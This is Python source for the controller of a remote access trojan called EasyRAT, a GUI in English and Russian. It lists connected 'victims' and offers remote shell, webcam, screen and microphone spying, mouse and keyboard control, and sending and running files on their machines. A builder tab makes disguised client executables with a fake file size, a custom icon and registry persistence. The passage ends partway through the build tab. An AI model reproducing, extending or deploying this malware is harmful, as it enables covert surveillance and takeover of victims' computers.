import socket
import threading
import pickle
import struct
import tkinter as tk
from tkinter import scrolledtext, messagebox, simpledialog, filedialog, ttk
import PIL.Image, PIL.ImageTk
import io
import os
import time
import subprocess
import sys
import tempfile
import shutil
import json
import re
import site

LANG = {
    'en': {
        'tab_settings': 'Settings',
        'tab_victims': 'Victims',
        'tab_build': 'Build',
        'tab_console': 'Console/Output',
        'tab_language': 'Language',
        'server_ip': 'Server IP:',
        'custom_ip': 'Use custom IP',
        'port': 'Port:',
        'local_port_hint': 'Your local port (e.g., 5555)',
        'start_server': 'Start Server',
        'server_stopped': 'Server: Stopped',
        'server_running': 'Server: Running on {ip}:{port}',
        'already_running': 'Server already running',
        'invalid_port': 'Invalid port',
        'failed_start': 'Failed to start server: {e}',
        'server_started': '[+] Server started on {ip}:{port}',
        'victim_column': 'Victim',
        'id_column': 'ID',
        'address_column': 'Address',
        'warning_no_victim': 'Warning',
        'no_victim_selected': 'No victim selected',
        'error_disconnected': 'Victim disconnected',
        'menu_shell': 'Shell',
        'menu_webcam': 'Webcam',
        'menu_screen': 'Screen Stream',
        'menu_mic': 'Microphone',
        'menu_mouse': 'Control Mouse',
        'menu_keys': 'Send Keys',
        'menu_exec_file': 'Execute File',
        'menu_send_file': 'Send & Run File',
        'menu_shutdown': 'Shutdown',
        'menu_reboot': 'Reboot',
        'menu_logoff': 'Logoff',
        'menu_hibernate': 'Hibernate',
        'menu_sleep': 'Sleep',
        'menu_lock': 'Lock Workstation',
        'shell_title': 'Remote Shell - {name}',
        'run_button': 'Run',
        'webcam_title': 'Webcam Stream - {name}',
        'screen_title': 'Screen Stream - {name}',
        'stop_button': 'Stop',
        'no_webcam': 'No webcam on victim',
        'mic_title': 'Microphone - {name}',
        'start_rec': 'Start Recording',
        'stop_rec': 'Stop Recording',
        'recording_started': 'Recording started',
        'recording_stopped': 'Stopped',
        'mouse_title': 'Mouse Control - {name}',
        'mouse_instruction': 'Moving/clicks control victim\'s mouse. Close window to stop.',
        'send_keys_title': 'Send Keys',
        'send_keys_prompt': 'Text to type on victim:',
        'result_title': 'Result',
        'exec_title': 'Execute file',
        'exec_prompt': 'Full path on victim (e.g., C:\\Windows\\System32\\calc.exe):',
        'send_file_title': 'Select file to send and execute on victim',
        'system_command_title': 'System Command',
        'build_header': 'Build Client Executable',
        'output_filename': 'Output filename:',
        'save_folder': 'Save to folder:',
        'browse': 'Browse',
        'server_host': 'Server IP/Host:',
        'server_host_hint': 'portmap.io IP (e.g., example-40453.portmap.host)',
        'server_port': 'Server Port:',
        'server_port_hint': 'Public portmap.io port (e.g., 40453)',
        'icon_file': 'Icon file (png/jpg/ico):',
        'file_version': 'File version (e.g., 1.2.3.0):',
        'process_name': 'Process name:',
        'fake_size': 'Fake file size:',
        'bytes': 'Bytes',
        'kb': 'KB',
        'mb': 'MB',
        'safe_mode': 'Safe Mode (no persistence, for testing)',
        'build_button': 'Build Executable',
        'building': 'Building standalone executable... (this may take 2-3 minutes)',
        'build_failed': 'Build failed:\n{err}',
        'not_found_victim_py': 'ERROR: victim.py not found in current directory!',
        'safe_mode_enabled': 'Safe Mode enabled: persistence disabled',
        'build_success': 'Build successful!\nFile saved as: {path}',
        'safe_mode_warning': 'Safe Mode build: no persistence, file won\'t install itself.',
        'normal_warning': 'Warning: Normal build will copy itself to system and add to registry (persistence).',
        'padding_info': 'Padded from {old} to {new} bytes (requested {val} {unit})',
        'console_welcome': '=== EasyRAT Console/Output ===\nServer not started. Use Settings tab to start.\n',
        'log_new_victim': '[+] New victim connected: {addr} (ID: {id})',
        'log_victim_disconnected': '[-] Victim disconnected: {name} (ID: {id})',
        'log_sent_command': '[>] Sent command \'{cmd}\' to victim {id} (data: {data})',
        'log_response': '[<] Response from victim {id}: {resp}',
        'log_command_error': '[-] Command error to victim {id}: {err}',
        'log_build_start': 'Building standalone executable... (this may take 2-3 minutes)',
        'log_build_success': 'Build successful! File saved as: {path}',
        'log_build_failed': 'Build failed:\n{err}',
        'log_padding': 'Padded from {old} to {new} bytes (requested {val} {unit})',
        'log_icon_error': 'Failed to convert icon: {e}',
        'log_exe_not_found': 'Executable not found after build.',
        'log_server_start': '[+] Server started on {ip}:{port}',
        'log_server_failed': '[-] Failed to start server: {e}',
        'language_header': 'Select Interface Language',
        'lang_english': 'English',
        'lang_russian': 'Русский',
        'language_changed': 'Language changed to {lang}',
    },
    'ru': {
        'tab_settings': 'Настройки',
        'tab_victims': 'Жертвы',
        'tab_build': 'Сборка',
        'tab_console': 'Консоль/Вывод',
        'tab_language': 'Язык',
        'server_ip': 'IP сервера:',
        'custom_ip': 'Свой IP',
        'port': 'Порт:',
        'local_port_hint': 'Ваш локальный порт (например, 5555)',
        'start_server': 'Запустить сервер',
        'server_stopped': 'Сервер: Остановлен',
        'server_running': 'Сервер: Запущен на {ip}:{port}',
        'already_running': 'Сервер уже запущен',
        'invalid_port': 'Неверный порт',
        'failed_start': 'Ошибка запуска сервера: {e}',
        'server_started': '[+] Сервер запущен на {ip}:{port}',
        'victim_column': 'Жертва',
        'id_column': 'ID',
        'address_column': 'Адрес',
        'warning_no_victim': 'Предупреждение',
        'no_victim_selected': 'Жертва не выбрана',
        'error_disconnected': 'Жертва отключена',
        'menu_shell': 'Командная строка',
        'menu_webcam': 'Веб-камера',
        'menu_screen': 'Рабочий стол',
        'menu_mic': 'Микрофон',
        'menu_mouse': 'Управление мышью',
        'menu_keys': 'Отправить текст',
        'menu_exec_file': 'Запустить файл',
        'menu_send_file': 'Отправить и запустить файл',
        'menu_shutdown': 'Выключить',
        'menu_reboot': 'Перезагрузить',
        'menu_logoff': 'Выйти из системы',
        'menu_hibernate': 'Гибернация',
        'menu_sleep': 'Сон',
        'menu_lock': 'Заблокировать',
        'shell_title': 'Удалённая консоль - {name}',
        'run_button': 'Выполнить',
        'webcam_title': 'Веб-камера - {name}',
        'screen_title': 'Рабочий стол - {name}',
        'stop_button': 'Стоп',
        'no_webcam': 'Нет веб-камеры у жертвы',
        'mic_title': 'Микрофон - {name}',
        'start_rec': 'Начать запись',
        'stop_rec': 'Остановить запись',
        'recording_started': 'Запись начата',
        'recording_stopped': 'Остановлено',
        'mouse_title': 'Управление мышью - {name}',
        'mouse_instruction': 'Движения и клики управляют мышью жертвы. Закройте окно для остановки.',
        'send_keys_title': 'Отправить текст',
        'send_keys_prompt': 'Текст для ввода на машине жертвы:',
        'result_title': 'Результат',
        'exec_title': 'Запустить файл',
        'exec_prompt': 'Полный путь на жертве (например, C:\\Windows\\System32\\calc.exe):',
        'send_file_title': 'Выберите файл для отправки и запуска на жертве',
        'system_command_title': 'Системная команда',
        'build_header': 'Сборка клиента',
        'output_filename': 'Имя выходного файла:',
        'save_folder': 'Папка сохранения:',
        'browse': 'Обзор',
        'server_host': 'IP/Хост сервера:',
        'server_host_hint': 'portmap.io IP (например, example-40453.portmap.host)',
        'server_port': 'Порт сервера:',
        'server_port_hint': 'Публичный portmap.io порт (например, 40453)',
        'icon_file': 'Файл иконки (png/jpg/ico):',
        'file_version': 'Версия файла (например, 1.2.3.0):',
        'process_name': 'Имя процесса:',
        'fake_size': 'Поддельный размер:',
        'bytes': 'Байты',
        'kb': 'КБ',
        'mb': 'МБ',
        'safe_mode': 'Безопасный режим (без сохранения в системе, для тестов)',
        'build_button': 'Собрать EXE',
        'building': 'Сборка автономного exe... (займёт 2-3 минуты)',
        'build_failed': 'Ошибка сборки:\n{err}',
        'not_found_victim_py': 'ОШИБКА: victim.py не найден в текущей папке!',
        'safe_mode_enabled': 'Безопасный режим включён: персистентность отключена',
        'build_success': 'Сборка успешна!\nФайл сохранён: {path}',
        'safe_mode_warning': 'Сборка в безопасном режиме: файл не будет копировать себя в систему и реестр.',
        'normal_warning': 'Предупреждение: обычная сборка скопирует себя в систему и добавит в автозагрузку (персистентность).',
        'padding_info': 'Дополнен с {old} до {new} байт (запрошено {val} {unit})',
        'console_welcome': '=== EasyRAT Консоль/Вывод ===\nСервер не запущен. Используйте вкладку Настройки для запуска.\n',
        'log_new_victim': '[+] Новая жертва подключена: {addr} (ID: {id})',
        'log_victim_disconnected': '[-] Жертва отключена: {name} (ID: {id})',
        'log_sent_command': '[>] Отправлена команда \'{cmd}\' жертве {id} (данные: {data})',
        'log_response': '[<] Ответ от жертвы {id}: {resp}',
        'log_command_error': '[-] Ошибка команды для жертвы {id}: {err}',
        'log_build_start': 'Сборка автономного exe... (займёт 2-3 минуты)',
        'log_build_success': 'Сборка успешна! Файл сохранён: {path}',
        'log_build_failed': 'Ошибка сборки:\n{err}',
        'log_padding': 'Дополнен с {old} до {new} байт (запрошено {val} {unit})',
        'log_icon_error': 'Ошибка конвертации иконки: {e}',
        'log_exe_not_found': 'Исполняемый файл не найден после сборки.',
        'log_server_start': '[+] Сервер запущен на {ip}:{port}',
        'log_server_failed': '[-] Ошибка запуска сервера: {e}',
        'language_header': 'Выберите язык интерфейса',
        'lang_english': 'English',
        'lang_russian': 'Русский',
        'language_changed': 'Язык изменён на {lang}',
    }
}


class ToolTip:
    def __init__(self, widget, text_key, parent):
        self.widget = widget
        self.text_key = text_key
        self.parent = parent
        self.tip_window = None
        widget.bind('<Enter>', self.show_tip)
        widget.bind('<Leave>', self.hide_tip)

    def show_tip(self, event=None):
        text = self.parent.tr(self.text_key)
        x, y, _, _ = self.widget.bbox("insert")
        x += self.widget.winfo_rootx() + 25
        y += self.widget.winfo_rooty() + 25
        self.tip_window = tw = tk.Toplevel(self.widget)
        tw.wm_overrideredirect(True)
        tw.wm_geometry(f"+{x}+{y}")
        label = tk.Label(tw, text=text, justify=tk.LEFT,
                         background="#ffffe0", relief=tk.SOLID, borderwidth=1,
                         font=("Arial", 9))
        label.pack()

    def hide_tip(self, event=None):
        if self.tip_window:
            self.tip_window.destroy()
            self.tip_window = None


class HistoryComboBox(ttk.Combobox):
    def __init__(self, parent, history_key, width=40, **kwargs):
        self.history_key = history_key
        self.history_file = "easyrat_history.json"
        self.values = self.load_history()
        super().__init__(parent, values=self.values, width=width, **kwargs)
        self.set('')
        self.bind('<KeyPress-Return>', self.save_value)
        self.bind('<<ComboboxSelected>>', self.save_value)

    def load_history(self):
        try:
            with open(self.history_file, 'r') as f:
                data = json.load(f)
                return data.get(self.history_key, [])
        except:
            return []

    def save_history(self, values):
        try:
            data = {}
            if os.path.exists(self.history_file):
                with open(self.history_file, 'r') as f:
                    data = json.load(f)
            data[self.history_key] = values[:20]
            with open(self.history_file, 'w') as f:
                json.dump(data, f, indent=2)
        except:
            pass

    def save_value(self, event=None):
        value = self.get().strip()
        if value and value not in self.values:
            self.values.insert(0, value)
            self.save_history(self.values)
            self['values'] = self.values


class RATServer:
    def __init__(self):
        self.current_lang = 'en'
        self.load_language_from_config()
        self.root = tk.Tk()
        self.root.title(self.tr('tab_settings') + " - EasyRAT")
        self.root.geometry("950x800")
        self.root.configure(bg='#2c3e50')

        self.server_socket = None
        self.server_running = False
        self.clients = {}
        self.client_counter = 0

        self.last_server_host = "127.0.0.1"
        self.last_server_port = "5555"

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)

        self.settings_frame = tk.Frame(self.notebook, bg='#2c3e50')
        self.victims_frame = tk.Frame(self.notebook, bg='#2c3e50')
        self.build_frame = tk.Frame(self.notebook, bg='#2c3e50')
        self.console_frame = tk.Frame(self.notebook, bg='#2c3e50')
        self.language_frame = tk.Frame(self.notebook, bg='#2c3e50')

        self.notebook.add(self.settings_frame, text="Placeholder")
        self.notebook.add(self.victims_frame, text="Placeholder")
        self.notebook.add(self.build_frame, text="Placeholder")
        self.notebook.add(self.console_frame, text="Placeholder")
        self.notebook.add(self.language_frame, text="Placeholder")

        self.widgets_to_translate = []

        self.create_settings_tab()
        self.create_victims_tab()
        self.create_build_tab()
        self.create_console_tab()
        self.create_language_tab()

        self.apply_language()

    def tr(self, key, **kwargs):
        text = LANG[self.current_lang].get(key, key)
        if kwargs:
            try:
                text = text.format(**kwargs)
            except:
                pass
        return text

    def load_language_from_config(self):
        try:
            with open('easyrat_config.json', 'r') as f:
                config = json.load(f)
                if config.get('language') in ['en', 'ru']:
                    self.current_lang = config['language']
        except:
            pass

    def save_language_config(self):
        try:
            with open('easyrat_config.json', 'w') as f:
                json.dump({'language': self.current_lang}, f)
        except:
            pass

    def set_language(self, lang):
        if lang in ['en', 'ru']:
            self.current_lang = lang
            self.save_language_config()
            self.apply_language()
            self.log_console(self.tr('language_changed', lang='English' if lang == 'en' else 'Русский'))

    def apply_language(self):
        self.root.title(self.tr('tab_language') + " - EasyRAT")
        self.notebook.tab(0, text=self.tr('tab_settings'))
        self.notebook.tab(1, text=self.tr('tab_victims'))
        self.notebook.tab(2, text=self.tr('tab_build'))
        self.notebook.tab(3, text=self.tr('tab_console'))
        self.notebook.tab(4, text=self.tr('tab_language'))
        for item in self.widgets_to_translate:
            if len(item) == 2:
                widget, key = item
                if isinstance(widget, (tk.Label, tk.Button, tk.Frame, ttk.LabelFrame, tk.Checkbutton)):
                    try:
                        widget.config(text=self.tr(key))
                    except:
                        pass
            elif len(item) == 3:
                widget, attr, key = item
                try:
                    if attr == 'text':
                        widget.config(text=self.tr(key))
                    elif attr == 'title':
                        widget.title(self.tr(key))
                except:
                    pass
        self.update_context_menu()
        if hasattr(self, 'unit_menu'):
            unit_vals = [self.tr('bytes'), self.tr('kb'), self.tr('mb')]
            self.unit_menu['values'] = unit_vals
            current = self.fake_size_unit.get()
            if current in unit_vals:
                self.fake_size_unit.set(current)
            else:
                self.fake_size_unit.set(unit_vals[2])

    def register_widget(self, widget, key):
        self.widgets_to_translate.append((widget, key))

    def update_context_menu(self):
        self.context_menu = tk.Menu(self.root, tearoff=0)
        functions = [
            (self.tr('menu_shell'), self.open_shell_window),
            (self.tr('menu_webcam'), self.open_webcam_window),
            (self.tr('menu_screen'), self.open_screen_window),
            (self.tr('menu_mic'), self.open_mic_window),
            (self.tr('menu_mouse'), self.open_mouse_window),
            (self.tr('menu_keys'), self.open_keys_window),
            (self.tr('menu_exec_file'), self.open_exec_file_window),
            (self.tr('menu_send_file'), self.open_send_file_window),
            (self.tr('menu_shutdown'), lambda: self.system_cmd_on_victim("system_shutdown")),
            (self.tr('menu_reboot'), lambda: self.system_cmd_on_victim("system_reboot")),
            (self.tr('menu_logoff'), lambda: self.system_cmd_on_victim("system_logoff")),
            (self.tr('menu_hibernate'), lambda: self.system_cmd_on_victim("system_hibernate")),
            (self.tr('menu_sleep'), lambda: self.system_cmd_on_victim("system_sleep")),
            (self.tr('menu_lock'), lambda: self.system_cmd_on_victim("system_lock"))
        ]
        for text, cmd in functions:
            self.context_menu.add_command(label=text, command=cmd)

    # ---------- Settings Tab ----------
    def create_settings_tab(self):
        frame = tk.Frame(self.settings_frame, bg='#2c3e50')
        frame.pack(pady=50)

        lbl_ip = tk.Label(frame, fg='white', bg='#2c3e50', font=('Arial', 12))
        lbl_ip.grid(row=0, column=0, padx=10, pady=10, sticky='e')
        self.register_widget(lbl_ip, 'server_ip')
        self.ip_entry = tk.Entry(frame, width=20, font=('Arial', 12))
        self.ip_entry.grid(row=0, column=1, padx=10, pady=10)
        self.ip_entry.insert(0, "0.0.0.0")
        self.custom_ip_var = tk.BooleanVar(value=False)
        self.custom_ip_check = tk.Checkbutton(frame, variable=self.custom_ip_var, bg='#2c3e50', fg='white',
                                              selectcolor='#2c3e50')
        self.custom_ip_check.grid(row=0, column=2, padx=5, pady=10)
        self.register_widget(self.custom_ip_check, 'custom_ip')

        def on_custom_ip_toggle():
            if self.custom_ip_var.get():
                self.ip_entry.config(state='normal')
            else:
                self.ip_entry.config(state='disabled')
                self.ip_entry.delete(0, tk.END)
                self.ip_entry.insert(0, "0.0.0.0")

        self.custom_ip_var.trace('w', lambda *args: on_custom_ip_toggle())
        on_custom_ip_toggle()

        lbl_port = tk.Label(frame, fg='white', bg='#2c3e50', font=('Arial', 12))
        lbl_port.grid(row=1, column=0, padx=10, pady=10, sticky='e')
        self.register_widget(lbl_port, 'port')
        self.port_combo = HistoryComboBox(frame, history_key='server_port', width=18)
        self.port_combo.grid(row=1, column=1, padx=10, pady=10)
        self.port_combo.set("5555")
        port_hint_label = tk.Label(frame, text="?", fg='blue', bg='#2c3e50', font=('Arial', 10, 'bold'),
                                   cursor='question_arrow')
        port_hint_label.grid(row=1, column=2, padx=5, pady=10)
        ToolTip(port_hint_label, 'local_port_hint', self)

        self.start_btn = tk.Button(frame, command=self.start_server, bg='#1abc9c', fg='white', font=('Arial', 12),
                                   padx=20)
        self.start_btn.grid(row=2, column=0, columnspan=3, pady=20)
        self.register_widget(self.start_btn, 'start_server')

        self.status_label = tk.Label(frame, fg='red', bg='#2c3e50', font=('Arial', 10))
        self.status_label.grid(row=3, column=0, columnspan=3)
        self.update_status_text()

    def update_status_text(self):
        if self.server_running:
            ip = self.ip_entry.get().strip()
            port = self.port_combo.get().strip()
            self.status_label.config(text=self.tr('server_running', ip=ip, port=port), fg='green')
        else:
            self.status_label.config(text=self.tr('server_stopped'), fg='red')

    def start_server(self):
        if self.server_running:
            messagebox.showinfo(self.tr('already_running'), self.tr('already_running'))
            return
        ip = self.ip_entry.get().strip()
        try:
            port = int(self.port_combo.get().strip())
        except:
            messagebox.showerror(self.tr('invalid_port'), self.tr('invalid_port'))
            return
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((ip, port))
            self.server_socket.listen(5)
            self.server_running = True
            self.update_status_text()
            self.start_btn.config(state='disabled')
            self.log_console(self.tr('log_server_start', ip=ip, port=port))
            threading.Thread(target=self.accept_clients, daemon=True).start()
        except Exception as e:
            self.log_console(self.tr('log_server_failed', e=str(e)))
            messagebox.showerror(self.tr('failed_start', e=str(e)), self.tr('failed_start', e=str(e)))

    def accept_clients(self):
        while self.server_running:
            try:
                conn, addr = self.server_socket.accept()
                self.client_counter += 1
                client_id = self.client_counter
                self.clients[client_id] = {'conn': conn, 'addr': addr, 'name': f"{addr[0]}:{addr[1]}"}
                self.log_console(self.tr('log_new_victim', addr=f"{addr[0]}:{addr[1]}", id=client_id))
                self.root.after(0, self.add_victim_to_list, client_id, self.clients[client_id]['name'])
                threading.Thread(target=self.handle_client, args=(client_id,), daemon=True).start()
            except:
                break

    def handle_client(self, client_id):
        conn = self.clients[client_id]['conn']
        while self.server_running and client_id in self.clients:
            try:
                conn.settimeout(5)
                data = conn.recv(1)
                if not data:
                    break
            except socket.timeout:
                continue
            except:
                break
        self.log_console(self.tr('log_victim_disconnected', name=self.clients[client_id]['name'], id=client_id))
        self.root.after(0, self.remove_victim_from_list, client_id)
        if client_id in self.clients:
            try:
                self.clients[client_id]['conn'].close()
            except:
                pass
            del self.clients[client_id]

    # ---------- Victims Tab ----------
    def create_victims_tab(self):
        columns = ("ID", "Address")
        self.tree = ttk.Treeview(self.victims_frame, columns=columns, show="tree headings")
        self.tree.heading("#0", text=self.tr('victim_column'))
        self.tree.heading("ID", text=self.tr('id_column'))
        self.tree.heading("Address", text=self.tr('address_column'))
        self.tree.column("#0", width=200)
        self.tree.column("ID", width=50)
        self.tree.column("Address", width=200)
        self.tree.pack(fill='both', expand=True, padx=10, pady=10)
        self.update_context_menu()
        self.tree.bind("<Button-3>", self.show_context_menu)

    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)

    def get_selected_client_id(self):
        selection = self.tree.selection()
        if not selection:
            messagebox.showwarning(self.tr('warning_no_victim'), self.tr('no_victim_selected'))
            return None
        item = selection[0]
        client_id = int(self.tree.item(item, "values")[0])
        if client_id not in self.clients:
            messagebox.showerror(self.tr('error_disconnected'), self.tr('error_disconnected'))
            return None
        return client_id

    def add_victim_to_list(self, client_id, name):
        self.tree.insert("", "end", text=name, values=(client_id, name), iid=str(client_id))

    def remove_victim_from_list(self, client_id):
        if self.tree.exists(str(client_id)):
            self.tree.delete(str(client_id))

    # ---------- Communication ----------
    def send_command_to(self, client_id, cmd, data=None):
        if client_id not in self.clients:
            self.log_console(f"[-] Command '{cmd}' failed: client {client_id} not found")
            return None
        conn = self.clients[client_id]['conn']
        try:
            msg = {'cmd': cmd, 'data': data}
            serialized = pickle.dumps(msg)
            length = struct.pack('!I', len(serialized))
            conn.send(length + serialized)
            self.log_console(self.tr('log_sent_command', cmd=cmd, id=client_id, data=str(data)[:100]))
            resp_len = struct.unpack('!I', conn.recv(4))[0]
            resp_data = b''
            while len(resp_data) < resp_len:
                chunk = conn.recv(min(4096, resp_len - len(resp_data)))
                if not chunk:
                    break
                resp_data += chunk
            resp = pickle.loads(resp_data)
            self.log_console(self.tr('log_response', id=client_id, resp=str(resp)[:200]))
            return resp
        except Exception as e:
            self.log_console(self.tr('log_command_error', id=client_id, err=str(e)))
            self.root.after(0, self.remove_victim_from_list, client_id)
            if client_id in self.clients:
                del self.clients[client_id]
            return None

    # ---------- Функции для работы с жертвой ----------
    def open_shell_window(self):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        win = tk.Toplevel(self.root)
        win.title(self.tr('shell_title', name=self.clients[client_id]['name']))
        win.geometry("700x500")
        win.configure(bg='#2c3e50')
        output = scrolledtext.ScrolledText(win, width=80, height=20, bg='#ecf0f1')
        output.pack(padx=5, pady=5, fill='both', expand=True)
        entry = tk.Entry(win, width=80, bg='white')
        entry.pack(padx=5, pady=5)

        def execute():
            cmd = entry.get()
            entry.delete(0, tk.END)
            output.insert(tk.END, f"> {cmd}\n")
            res = self.send_command_to(client_id, 'shell', cmd)
            output.insert(tk.END, str(res) + "\n")
            output.see(tk.END)

        btn = tk.Button(win, text=self.tr('run_button'), command=execute, bg='#1abc9c', fg='white')
        btn.pack(pady=5)
        self.register_widget(btn, 'run_button')

    def open_webcam_window(self):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        win = tk.Toplevel(self.root)
        win.title(self.tr('webcam_title', name=self.clients[client_id]['name']))
        win.geometry("640x520")
        win.configure(bg='black')
        label = tk.Label(win, bg='black')
        label.pack()
        streaming = True

        def capture():
            while streaming:
                res = self.send_command_to(client_id, 'webcam_frame')
                if res == 'NO_CAM':
                    self.log_console(f"[-] No webcam on victim {client_id}")
                    messagebox.showerror(self.tr('no_webcam'), self.tr('no_webcam'))
                    break
                if res and isinstance(res, bytes):
                    try:
                        img = PIL.Image.open(io.BytesIO(res))
                        img.thumbnail((640, 480))
                        imgtk = PIL.ImageTk.PhotoImage(img)
                        label.config(image=imgtk)
                        label.image = imgtk
                    except:
                        pass
                time.sleep(0.05)

        def stop():
            nonlocal streaming
            streaming = False
            win.destroy()

        threading.Thread(target=capture, daemon=True).start()
        win.protocol("WM_DELETE_WINDOW", stop)
        btn_stop = tk.Button(win, text=self.tr('stop_button'), command=stop, bg='red', fg='white')
        btn_stop.pack()
        self.register_widget(btn_stop, 'stop_button')

    def open_screen_window(self):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        win = tk.Toplevel(self.root)
        win.title(self.tr('screen_title', name=self.clients[client_id]['name']))
        win.geometry("820x660")
        win.configure(bg='black')
        label = tk.Label(win, bg='black')
        label.pack()
        streaming = True

        def capture():
            while streaming:
                res = self.send_command_to(client_id, 'screen_frame')
                if res and isinstance(res, bytes) and res != 'NO_SCREEN':
                    try:
                        img = PIL.Image.open(io.BytesIO(res))
                        imgtk = PIL.ImageTk.PhotoImage(img)
                        label.config(image=imgtk)
                        label.image = imgtk
                    except Exception as e:
                        print(f"Screen error: {e}")
                time.sleep(0.1)

        def stop():
            nonlocal streaming
            streaming = False
            win.destroy()

        threading.Thread(target=capture, daemon=True).start()
        win.protocol("WM_DELETE_WINDOW", stop)
        btn_stop = tk.Button(win, text=self.tr('stop_button'), command=stop, bg='red', fg='white')
        btn_stop.pack()
        self.register_widget(btn_stop, 'stop_button')

    def open_mic_window(self):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        win = tk.Toplevel(self.root)
        win.title(self.tr('mic_title', name=self.clients[client_id]['name']))
        win.geometry("300x150")
        win.configure(bg='#2c3e50')
        log = scrolledtext.ScrolledText(win, width=40, height=5)
        log.pack(pady=10)

        def start_rec():
            log.insert(tk.END, self.tr('recording_started') + "\n")
            res = self.send_command_to(client_id, 'mic_start')
            log.insert(tk.END, str(res) + "\n")

        def stop_rec():
            res = self.send_command_to(client_id, 'mic_stop')
            log.insert(tk.END, self.tr('recording_stopped') + ": " + str(res) + "\n")

        btn_start = tk.Button(win, text=self.tr('start_rec'), command=start_rec, bg='#1abc9c', fg='white')
        btn_start.pack(pady=5)
        btn_stop = tk.Button(win, text=self.tr('stop_rec'), command=stop_rec, bg='#e67e22', fg='white')
        btn_stop.pack(pady=5)
        self.register_widget(btn_start, 'start_rec')
        self.register_widget(btn_stop, 'stop_rec')

    def open_mouse_window(self):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        from pynput.mouse import Listener, Button
        win = tk.Toplevel(self.root)
        win.title(self.tr('mouse_title', name=self.clients[client_id]['name']))
        win.geometry("300x100")
        win.configure(bg='#2c3e50')
        label = tk.Label(win, fg='white', bg='#2c3e50')
        label.pack(pady=20)
        self.register_widget(label, 'mouse_instruction')
        listener = None

        def on_move(x, y):
            self.send_command_to(client_id, 'mouse_move', (x, y))

        def on_click(x, y, button, pressed):
            btn = 'left' if button == Button.left else ('right' if button == Button.right else 'middle')
            self.send_command_to(client_id, 'mouse_click', (btn, pressed))

        def start():
            nonlocal listener
            listener = Listener(on_move=on_move, on_click=on_click)
            listener.start()

        def stop():
            if listener:
                listener.stop()
            win.destroy()

        start()
        win.protocol("WM_DELETE_WINDOW", stop)

    def open_keys_window(self):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        text = simpledialog.askstring(self.tr('send_keys_title'), self.tr('send_keys_prompt'))
        if text:
            res = self.send_command_to(client_id, 'keyboard_type', text)
            messagebox.showinfo(self.tr('result_title'), str(res))

    def open_exec_file_window(self):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        path = simpledialog.askstring(self.tr('exec_title'), self.tr('exec_prompt'))
        if path:
            res = self.send_command_to(client_id, 'exec_file', path)
            messagebox.showinfo(self.tr('result_title'), str(res))

    def open_send_file_window(self):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        filepath = filedialog.askopenfilename(title=self.tr('send_file_title'))
        if filepath:
            with open(filepath, 'rb') as f:
                content = f.read()
            filename = os.path.basename(filepath)
            res = self.send_command_to(client_id, 'send_file', {'content': content, 'name': filename})
            messagebox.showinfo(self.tr('result_title'), str(res))

    def system_cmd_on_victim(self, cmd_type):
        client_id = self.get_selected_client_id()
        if not client_id:
            return
        res = self.send_command_to(client_id, cmd_type)
        messagebox.showinfo(self.tr('system_command_title'), str(res))

    # ---------- Build Tab ----------
    def create_build_tab(self):
        build_header = tk.Frame(self.build_frame, bg='#1abc9c', height=50)
        build_header.pack(fill='x')
        title = tk.Label(build_header, font=('Arial', 16, 'bold'), fg='white', bg='#1abc9c')
        title.pack(pady=10)
        self.register_widget(title, 'build_header')

        form = tk.Frame(self.build_frame, bg='#2c3e50')
        form.pack(pady=20, padx=20, fill='both', expand=True)

        # Output filename
        lbl_out = tk.Label(form, fg='white', bg='#2c3e50', font=('Arial', 10))
        lbl_out.grid(row=0, column=0, sticky='w', pady=5)
        self.register_widget(lbl_out, 'output_filename')
        self.output_name_combo = HistoryComboBox(form, history_key='output_name', width=30)
        self.output_name_combo.grid(row=0, column=1, pady=5, padx=10)
        self.output_name_combo.set("client.exe")

        # Save folder
        lbl_folder = tk.Label(form, fg='white', bg='#2c3e50', font=('Arial', 10))
        lbl_folder.grid(row=1, column=0, sticky='w', pady=5)
        self.register_widget(lbl_folder, 'save_folder')
        self.output_dir_entry = tk.Entry(form, width=40, bg='white')
        self.output_dir_entry.grid(row=1, column=1, pady=5, padx=10)
        self.output_dir_entry.insert(0, os.getcwd())
        btn_browse = tk.Button(form, command=self.browse_output_dir, bg='#34495e', fg='white')
        btn_browse.grid(row=1, column=2, padx=5)
        self.register_widget(btn_browse, 'browse')

        # Server Host
        lbl_host = tk.Label(form, text="Server IP/Host:", fg='white', bg='#2c3e50', font=('Arial', 10))
        lbl_host.grid(row=2, column=0, sticky='w', pady=5)
        self.build_server_host_combo = HistoryComboBox(form, history_key='build_server_host', width=30)
        self.build_server_host_combo.grid(row=2, column=1, pady=5, padx=10)
        self.build_server_host_combo.set(self.last_server_host)
        self.register_widget(lbl_host, 'server_host')
        host_hint_label = tk.Label(form, text="?", fg='blue', bg='#2c3e50', font=('Arial', 10, 'bold'),
                                   cursor='question_arrow')
        host_hint_label.grid(row=2, column=2, padx=5, pady=5)
        ToolTip(host_hint_label, 'server_host_hint', self)

        # Server Port
        lbl_port = tk.Label(form, text="Server Port:", fg='white', bg='#2c3e50', font=('Arial', 10))
        lbl_port.grid(row=3, column=0, sticky='w', pady=5)
        self.build_server_port_combo = HistoryComboBox(form, history_key='build_server_port', width=30)
        self.build_server_port_combo.grid(row=3, column=1, pady=5, padx=10)
        self.build_server_port_combo.set(self.last_server_port)
        self.register_widget(lbl_port, 'server_port')
        port_hint_label = tk.Label(form, text="?", fg='blue', bg='#2c3e50', font=('Arial', 10, 'bold'),
                                   cursor='question_arrow')
        port_hint_label.grid(row=3, column=2, padx=5, pady=5)
        ToolTip(port_hint_label, 'server_port_hint', self)

        # Icon
        lbl_icon = tk.Label(form, fg='white', bg='#2c3e50', font=('Arial', 10))
        lbl_icon.grid(row=4, column=0, sticky='w', pady=5)
        self.register_widget(lbl_icon, 'icon_file')
        self.icon_path_entry = tk.Entry(form, width=40, bg='white')
        self.icon_path_entry.grid(row=4, column=1, pady=5, padx=10)
